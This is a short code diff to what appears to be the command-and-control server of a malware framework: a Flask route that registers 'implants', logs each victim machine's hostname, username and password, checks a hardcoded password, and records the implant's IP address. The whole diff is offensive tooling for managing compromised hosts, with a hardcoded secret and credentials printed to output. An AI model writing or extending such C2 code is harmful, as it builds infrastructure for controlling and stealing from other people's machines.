@@ -10,7 +10,7 @@ from constants import *
 
 rpc = Blueprint("rpc", __name__)
 
-password = "password"
+password = "SUPER_COMPLEX_PASSWORD_WOWZA!!!"
 
 @rpc.route("/register", methods=["POST"])
 def handle_register():
@@ -23,14 +23,15 @@ def handle_register():
     print(f'[+]    * Hostname: {register.Hostname}')
     print(f'[+]    * Username: {register.Username}')
     print(f'[+]    * Password: {register.Password}')
-    '''
+    
     if register.Password != password:
         abort(404)
     
-    r = make_implant(register)
-    db.session.add(r)
-    db.commit()
-    '''
+    r = make_implant(register, request.remote_addr)
+    
+    #db.session.add(r)
+    #db.commit()
+    
     # TODO If implant with same GUID has already been added, don't add and send failure back.
     # TODO If implant dies / kills itself, once last checkin expires, have Server remove said task from database
     print("[+] Watch out sexy ;) a New Implant connected!")
